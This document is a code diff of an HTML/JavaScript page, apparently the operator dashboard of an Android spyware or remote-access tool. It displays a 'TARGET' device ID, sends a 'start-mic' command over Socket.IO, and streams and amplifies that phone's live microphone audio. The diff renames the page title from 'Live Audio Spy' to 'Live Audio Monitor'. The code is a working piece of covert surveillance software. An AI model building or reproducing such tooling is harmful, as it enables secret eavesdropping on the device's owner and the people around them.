@@ -3,141 +3,265 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Audio Spy</title>
+    <title>Live Audio Monitor</title>
+    
+    <script src="/socket.io/socket.io.js"></script> <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
     <style>
-        body {
-            background-color: #1a1a1a;
-            color: #0f0;
-            font-family: 'Courier New', monospace;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
+        :root { --accent: #00ff88; --bg: #0a0a0a; }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; text-align: center; overflow: hidden; }
+        
+        .header { padding: 20px; display: flex; align-items: center; gap: 15px; background: #111; border-bottom: 1px solid #222; }
+        .back-btn { color: white; text-decoration: none; font-size: 1.2rem; cursor: pointer; }
+        
+        .device-info { margin-top: 20px; color: #aaa; font-size: 14px; letter-spacing: 1px; }
+        .device-info span { color: var(--accent); font-weight: bold; font-size: 18px; }
+
+        .mic-container { height: 40vh; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        
+        .mic-circle {
+            width: 130px; height: 130px; background: rgba(0, 255, 136, 0.05);
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            border: 2px solid var(--accent); position: relative; transition: 0.3s;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.1);
         }
-        h2 { margin-bottom: 20px; }
-        .visualizer {
-            width: 80%;
-            height: 100px;
-            background: #000;
-            border: 1px solid #0f0;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
+        .mic-circle.active { animation: pulse 1.5s infinite; background: rgba(0, 255, 136, 0.2); }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0.4); }
+            70% { box-shadow: 0 0 0 40px rgba(0, 255, 136, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 255, 136, 0); }
         }
-        .bar {
-            width: 100%;
-            height: 2px;
-            background: #0f0;
-            box-shadow: 0 0 10px #0f0;
-            transition: height 0.1s;
+
+        .visualizer { display: flex; gap: 6px; height: 60px; align-items: center; margin-top: 40px; }
+        .bar { width: 8px; height: 15px; background: var(--accent); border-radius: 10px; transition: 0.1s; opacity: 0.3; }
+        .active-bar { opacity: 1; box-shadow: 0 0 10px #00ff88; }
+
+        .controls { padding: 20px; display: flex; flex-direction: column; align-items: center; gap: 20px; }
+        .btn-group { display: flex; gap: 15px; flex-wrap: wrap; justify-content: center; }
+        
+        .btn { 
+            background: #1a1a1a; border: 1px solid #333; color: white; 
+            padding: 15px 30px; border-radius: 30px; cursor: pointer; 
+            display: flex; align-items: center; gap: 10px; font-weight: 600; font-size: 14px;
+            transition: all 0.3s ease; min-width: 120px; justify-content: center;
         }
-        button {
-            padding: 15px 30px;
-            font-size: 18px;
-            background: #000;
-            color: #0f0;
-            border: 1px solid #0f0;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        button:hover { background: #0f0; color: #000; }
-        .status { margin-top: 10px; font-size: 14px; color: #aaa; }
+        .btn:hover { background: #333; transform: scale(1.05); }
+        .btn.active { background: var(--accent); color: black; border-color: var(--accent); box-shadow: 0 0 15px rgba(0,255,136,0.4); }
+        .btn.stop:hover { background: #ff4444; border-color: #ff4444; box-shadow: 0 0 15px rgba(255,68,68,0.4); }
+        
+        .btn.boost.active { background: #ff9900; color: black; border-color: #ff9900; box-shadow: 0 0 15px rgba(255, 153, 0, 0.4); }
+
+        #statusText { font-family: 'Courier New', monospace; letter-spacing: 1px; }
+
     </style>
 </head>
 <body>
 
-    <h2>📡 LIVE AUDIO STREAM</h2>
-    
-    <div class="visualizer">
-        <div id="vis-bar" class="bar"></div>
+    <div class="header">
+        <a href="index.html" class="back-btn"><i class="fa-solid fa-arrow-left"></i> Back</a>
+        <h3>Live Audio Stream</h3>
     </div>
 
-    <button id="btn-listen" onclick="startListening()">🔇 CLICK TO START LISTENING</button>
-    <p class="status" id="status-text">Waiting for connection...</p>
+    <div class="device-info">
+        TARGET: <span id="targetDisplay">LOADING...</span>
+    </div>
 
-    <script src="/socket.io/socket.io.js"></script>
+    <div class="mic-container">
+        <div class="mic-circle" id="micCircle">
+            <i class="fa-solid fa-microphone fa-3x"></i>
+        </div>
+        
+        <div class="visualizer" id="visualizer">
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+            <div class="bar"></div><div class="bar"></div><div class="bar"></div><div class="bar"></div>
+            <div class="bar"></div><div class="bar"></div>
+        </div>
+        <p id="statusText" style="color: #888; margin-top: 25px; font-size: 0.9rem;">READY TO CONNECT</p>
+    </div>
+
+    <div class="controls">
+        <div class="btn-group">
+            <button class="btn" id="startBtn" onclick="connectAndListen()">
+                <i class="fa-solid fa-play"></i> LISTEN
+            </button>
+            
+            <button class="btn boost" id="boostBtn" onclick="toggleBoost()">
+                <i class="fa-solid fa-volume-high"></i> BOOST: OFF
+            </button>
+
+            <button class="btn stop" id="stopBtn" style="color: #ff4444;" onclick="stopListen()">
+                <i class="fa-solid fa-stop"></i> STOP
+            </button>
+        </div>
+    </div>
 
     <script>
-        const socket = io();
+        // ✅ AUTO DETECT SERVER URL (Taaki Localhost/Render dono pe chale)
+        const SERVER_URL = window.location.origin; 
         
-        // URL se Device ID nikalo (Example: view_audio.html?id=DEVICE123)
         const urlParams = new URLSearchParams(window.location.search);
-        const deviceID = urlParams.get('id');
+        const DEVICE_ID = urlParams.get('id'); 
 
-        const statusText = document.getElementById("status-text");
-        const btn = document.getElementById("btn-listen");
-        const visBar = document.getElementById("vis-bar");
-
+        let socket;
         let audioContext;
+        let gainNode; // Volume Booster
         let nextTime = 0;
+        let isStreaming = false;
+        let isBoosted = false;
 
-        if (!deviceID) {
-            statusText.innerText = "❌ Error: No Device ID Found in URL";
-        } else {
-            // Join Room
-            socket.emit("join", deviceID);
-            statusText.innerText = `🔗 Connected to: ${deviceID}`;
+        window.onload = function() {
+            if (!DEVICE_ID) {
+                alert("ID Missing!");
+                document.getElementById('targetDisplay').innerText = "NO ID FOUND";
+                return;
+            }
+            document.getElementById('targetDisplay').innerText = DEVICE_ID;
+        };
+
+        function connectAndListen() {
+            if (!DEVICE_ID) return;
+
+            // 1. Audio Context Setup (Browser click policy ke liye zaroori hai)
+            if (!audioContext) {
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+            }
+            if (audioContext.state === 'suspended') {
+                audioContext.resume();
+            }
+
+            // 🔊 Gain Node Setup (Volume Booster)
+            if (!gainNode) {
+                gainNode = audioContext.createGain();
+                gainNode.gain.value = 1; // Default Normal
+                gainNode.connect(audioContext.destination);
+            }
+
+            document.getElementById('statusText').innerText = "CONNECTING...";
+            document.getElementById('statusText').style.color = "yellow";
+
+            if(socket) socket.disconnect();
             
-            // Command bhejo Android ko ki Mic chalu kare
-            socket.emit("send-command", {
-                targetId: deviceID,
-                command: "start-mic" 
+            // ✅ Connect to Socket
+            socket = io(SERVER_URL);
+
+            socket.on("connect", () => {
+                console.log("✅ Connected to Server");
+                
+                // Join Room
+                socket.emit("join", DEVICE_ID);
+                
+                // Android Mic Start Command
+                console.log("📡 Sending start-mic...");
+                socket.emit("control-event", {
+                    room: DEVICE_ID,
+                    action: "start-mic"
+                });
+                
+                document.getElementById('statusText').innerText = "🔴 LIVE AUDIO (16kHz)";
+                document.getElementById('statusText').style.color = "#00ff88";
+
+                startUIEffects();
+                isStreaming = true;
+            });
+
+            // 🎤 RECEIVE AUDIO
+            socket.on("audio-stream", (data) => {
+                if (!isStreaming) return;
+                playPcmChunk(data);
+            });
+
+            socket.on("disconnect", () => {
+                stopListen();
             });
         }
 
-        function startListening() {
-            if (!audioContext) {
-                // Audio Context banau (Browser security ke liye click zaroori hai)
-                audioContext = new (window.AudioContext || window.webkitAudioContext)({
-                    sampleRate: 16000, // 🔥 Must match Android (16000Hz)
-                });
-                
-                btn.innerText = "🔊 LISTENING...";
-                btn.style.background = "#0f0";
-                btn.style.color = "#000";
-                statusText.innerText = "Receiving Audio Stream...";
+        // 🔥 Volume Boost Toggle Logic
+        function toggleBoost() {
+            if (!gainNode) return;
+            isBoosted = !isBoosted;
+            const btn = document.getElementById('boostBtn');
+            
+            if (isBoosted) {
+                gainNode.gain.value = 5.0; // 5x Volume (Tez Aawaz)
+                btn.innerHTML = '<i class="fa-solid fa-volume-high"></i> BOOST: ON';
+                btn.classList.add('active');
+            } else {
+                gainNode.gain.value = 1.0; // Normal Volume
+                btn.innerHTML = '<i class="fa-solid fa-volume-low"></i> BOOST: OFF';
+                btn.classList.remove('active');
             }
         }
 
-        // 🔥 RECEIVE AUDIO FROM SERVER
-        socket.on("audio-stream", (arrayBuffer) => {
-            if (!audioContext) return; // Agar user ne click nahi kiya to ignore karo
+        // 🔥 16000Hz PCM Player + Lag Fix
+        function playPcmChunk(arrayBuffer) {
+            if (!audioContext) return;
 
-            // Raw PCM Data (Int16) ko Float32 mein convert karo (WebAudio ke liye)
-            const audioData = new Int16Array(arrayBuffer);
-            const float32Data = new Float32Array(audioData.length);
+            const int16Array = new Int16Array(arrayBuffer);
+            const float32Array = new Float32Array(int16Array.length);
 
-            // Conversion Loop
-            for (let i = 0; i < audioData.length; i++) {
-                float32Data[i] = audioData[i] / 32768; // Convert -32768..32767 to -1.0..1.0
+            // Convert PCM 16-bit to Float32
+            for (let i = 0; i < int16Array.length; i++) {
+                float32Array[i] = int16Array[i] / 32768; 
             }
 
-            // Play Buffer
-            playAudioChunk(float32Data);
-            
-            // Visualizer Effect (Fake but responsive)
-            let volume = Math.abs(float32Data[0]) * 1000; 
-            visBar.style.height = Math.min(volume, 100) + "px";
-        });
-
-        function playAudioChunk(float32Data) {
-            const buffer = audioContext.createBuffer(1, float32Data.length, 16000);
-            buffer.getChannelData(0).set(float32Data);
+            // ⚠️ FIX: Rate must match Android (16000)
+            const audioBuffer = audioContext.createBuffer(1, float32Array.length, 16000);
+            audioBuffer.getChannelData(0).set(float32Array);
 
             const source = audioContext.createBufferSource();
-            source.buffer = buffer;
-            source.connect(audioContext.destination);
+            source.buffer = audioBuffer;
+            source.connect(gainNode); 
 
-            // Seamless Playing Logic (Queue System)
+            // 🔥 Lag Fix: Agar audio piche reh jaye, to current time pe reset karo
             if (nextTime < audioContext.currentTime) {
-                nextTime = audioContext.currentTime;
+                nextTime = audioContext.currentTime + 0.05; // 50ms buffer
             }
+            
             source.start(nextTime);
-            nextTime += buffer.duration;
+            nextTime += source.buffer.duration;
+            
+            animateBars();
+        }
+
+        function stopListen() {
+            isStreaming = false;
+            if (socket) {
+                if(DEVICE_ID) {
+                    socket.emit("control-event", { room: DEVICE_ID, action: "stop-mic" });
+                }
+                socket.disconnect();
+                socket = null;
+            }
+            stopUIEffects();
+            document.getElementById('statusText').innerText = "STOPPED";
+            document.getElementById('statusText').style.color = "#888";
+            
+            if(audioContext) nextTime = audioContext.currentTime; 
+        }
+
+        function startUIEffects() {
+            document.getElementById('micCircle').classList.add('active');
+            document.getElementById('startBtn').classList.add('active');
+            document.querySelectorAll('.bar').forEach(b => b.classList.add('active-bar'));
+        }
+
+        function stopUIEffects() {
+            document.getElementById('micCircle').classList.remove('active');
+            document.getElementById('startBtn').classList.remove('active');
+            document.querySelectorAll('.bar').forEach(b => {
+                b.style.height = "15px";
+                b.classList.remove('active-bar');
+            });
+        }
+
+        function animateBars() {
+            // Fake Visualizer Effect (Real data analysis heavy hoti hai, ye fast hai)
+            document.querySelectorAll('.bar').forEach(b => {
+                b.style.height = (Math.random() * 40 + 15) + "px";
+            });
         }
     </script>
+
 </body>
 </html>
